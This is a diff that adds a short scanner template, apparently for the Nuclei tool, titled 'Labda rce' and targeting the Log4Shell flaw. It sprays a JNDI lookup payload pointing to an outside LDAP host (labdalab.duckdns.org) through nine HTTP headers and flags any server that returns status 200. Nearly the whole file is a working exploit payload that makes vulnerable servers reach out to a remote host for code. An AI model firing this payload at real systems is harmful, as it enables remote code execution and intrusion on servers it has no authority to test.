@@ -1,0 +1,30 @@
+id: Labda_rce_apache
+
+info:
+  name: Labda rce
+  author: Labda
+  description: Log4Shell
+  tags: web, rce,
+
+requests:
+  - raw:
+      - |+
+        GET / HTTP/1.1
+        {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/a}
+    payloads:
+      header:
+        - User-Agent
+        - Date
+        - Content-Type
+        - Content-Encoding
+        - Pragma
+        - Cache-Control
+        - Origin
+        - Referer
+        - X-Api-Version
+    attack: batteringram
+    unsafe: true
+    matchers:
+        - type: status
+          status:
+            - 200
